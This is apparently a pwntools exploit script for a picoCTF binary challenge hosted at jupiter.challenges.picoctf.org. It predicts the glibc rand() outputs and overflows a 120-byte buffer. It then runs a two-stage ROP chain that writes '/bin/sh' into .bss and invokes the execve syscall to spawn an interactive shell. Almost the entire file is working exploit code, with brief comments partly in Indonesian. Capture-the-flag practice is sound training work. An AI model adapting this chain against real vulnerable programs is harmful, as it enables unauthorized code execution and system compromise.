#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template vuln
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'vuln')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOT:
        return remote('jupiter.challenges.picoctf.org',51462)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# Stripped:   No

p = start()

rand = 1804289383 % 100 #bcs rand always this on first https://www.geeksforgeeks.org/c/c-rand-function
ans1 = rand + 1
rand2 = 846930886 % 100
ans2 = rand2 +1
p.sendline(str(ans1).encode())
offset = 120
rop = ROP(exe)
pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_ret = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx_ret = rop.find_gadget(['pop rdx', 'ret'])[0]
pop_rax_ret = rop.find_gadget(['pop rax', 'ret'])[0]
syscall_ret = rop.find_gadget(['syscall', 'ret'])[0]
ret_gadget = rop.find_gadget(['ret'])[0]
bss_addr = exe.bss(0x800)
# step 1
rop_chain_read = b''
rop_chain_read += p64(pop_rdi_ret)
rop_chain_read += p64(0)              # Argumen 1: fd = 0 (stdin)
rop_chain_read += p64(pop_rsi_ret)
rop_chain_read += p64(bss_addr)       # Argumen 2: buf = alamat .bss
rop_chain_read += p64(pop_rdx_ret)
rop_chain_read += p64(9)              # Argumen 3: count = 8 bytes
rop_chain_read += p64(exe.sym.read)   # Panggil fungsi read
rop_chain_read += p64(exe.sym.main)
# --- TAHAP 2: ROP Chain untuk execve("/bin/sh", 0, 0) ---

padding = b'A'*120
payload = padding + rop_chain_read
p.sendline(payload)
input('Enter bosku')
p.sendline(b'/bin/sh\x00')


rop_chain_exec = b''
rop_chain_exec = p64(ret_gadget)
rop_chain_exec += p64(pop_rax_ret)
rop_chain_exec += p64(59)             # Argumen 1: rax = 59 (syscall execve)
rop_chain_exec += p64(pop_rdi_ret)
rop_chain_exec += p64(bss_addr)       # Argumen 2: rdi = pointer ke "/bin/sh"
rop_chain_exec += p64(pop_rsi_ret)
rop_chain_exec += p64(0)              # Argumen 3: rsi = 0 (NULL)
rop_chain_exec += p64(pop_rdx_ret)
rop_chain_exec += p64(0)              # Argumen 4: rdx = 0 (NULL)
rop_chain_exec += p64(syscall_ret)    # Panggil syscall

payload = padding + rop_chain_exec
p.sendline(str(ans2).encode())
p.sendline(payload)
p.interactive()

